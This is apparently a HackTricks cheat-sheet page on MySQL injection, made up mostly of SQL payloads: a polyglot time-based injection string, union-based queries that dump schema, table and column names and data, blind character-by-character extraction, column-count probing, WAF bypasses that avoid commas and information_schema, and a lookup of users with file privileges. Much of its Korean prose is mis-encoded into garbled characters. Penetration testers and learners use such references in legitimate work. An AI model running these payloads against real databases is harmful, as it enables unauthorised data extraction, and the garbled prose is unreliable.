# MySQL injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³ , ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## Comments
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## í¥ë¯¸ë¡œìš´ ê¸°ëŠ¥

### Mysql í™•ì¸:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### ìœ ìš©í•œ í•¨ìˆ˜
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## ëª¨ë“  ì£¼ì…
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
from [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## íë¦„

"í˜„ëŒ€" ë²„ì „ì˜ **MySQL**ì—ì„œëŠ” "_**information\_schema.tables**_"ë¥¼ "_**mysql.innodb\_table\_stats**_**"ë¡œ ëŒ€ì²´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì´ëŠ” WAFë¥¼ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **ì˜¤ì§ 1ê°œì˜ ê°’**

* `group_concat()`
* `Limit X,1`

### **ë¸”ë¼ì¸ë“œ í•˜ë‚˜ì”©**

* `substr(version(),X,1)='r'` ë˜ëŠ” `substring(version(),X,1)=0x70` ë˜ëŠ” `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **ë¸”ë¼ì¸ë“œ ì¶”ê°€í•˜ê¸°**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## ì—´ì˜ ìˆ˜ ê°ì§€

ê°„ë‹¨í•œ ORDER ì‚¬ìš©
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union Based
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**ì—¬ê¸°ì—ì„œ Mysql injectionì„ ì•…ìš©í•˜ì—¬ SSRFë¥¼ ì–»ëŠ” ë‹¤ì–‘í•œ ì˜µì…˜ì„ ë°°ì›Œë³´ì„¸ìš”** [**abuse a Mysql injection to obtain a SSRF**](mysql-ssrf.md)**.**

## WAF ìš°íšŒ ê¸°ë²•

### Information\_schema ëŒ€ì•ˆ

"í˜„ëŒ€" ë²„ì „ì˜ **MySQL**ì—ì„œëŠ” _**information\_schema.tables**_ë¥¼ _**mysql.innodb\_table\_stats**_ ë˜ëŠ” _**sys.x$schema\_flattened\_keys**_ ë˜ëŠ” **sys.schema\_table\_statistics**ë¡œ ëŒ€ì²´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### COMMAS ì—†ì´ MySQL injection

ì‰¼í‘œë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  2ê°œì˜ ì—´ ì„ íƒí•˜ê¸° ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### ì—´ ì´ë¦„ ì—†ì´ ê°’ ê²€ìƒ‰í•˜ê¸°

ì–´ë–¤ ì‹œì ì— í…Œì´ë¸”ì˜ ì´ë¦„ì€ ì•Œì§€ë§Œ í…Œì´ë¸” ì•ˆì˜ ì—´ ì´ë¦„ì€ ëª¨ë¥¼ ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì€ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì—´ì˜ ê°œìˆ˜ë¥¼ ì°¾ìœ¼ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
ë‘ ê°œì˜ ì—´ì´ ìˆë‹¤ê³  ê°€ì •í•  ë•Œ (ì²« ë²ˆì§¸ ì—´ì€ IDì´ê³  ë‘ ë²ˆì§¸ ì—´ì€ í”Œë˜ê·¸) í”Œë˜ê·¸ì˜ ë‚´ìš©ì„ ë¬¸ì ë‹¨ìœ„ë¡œ ë¸Œë£¨íŠ¸í¬ìŠ¤ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
ë” ë§ì€ ì •ë³´ëŠ” [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### MySQL ì—­ì‚¬

**sys.x$statement\_analysis** í…Œì´ë¸”ì„ ì½ì–´ MySQL ë‚´ ë‹¤ë¥¸ ì‹¤í–‰ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë²„ì „ ëŒ€ì•ˆ**s**
```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## ë‹¤ë¥¸ MYSQL ì¸ì ì…˜ ê°€ì´ë“œ

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

## ì°¸ê³ ìë£Œ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³  ìˆëŠ” ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
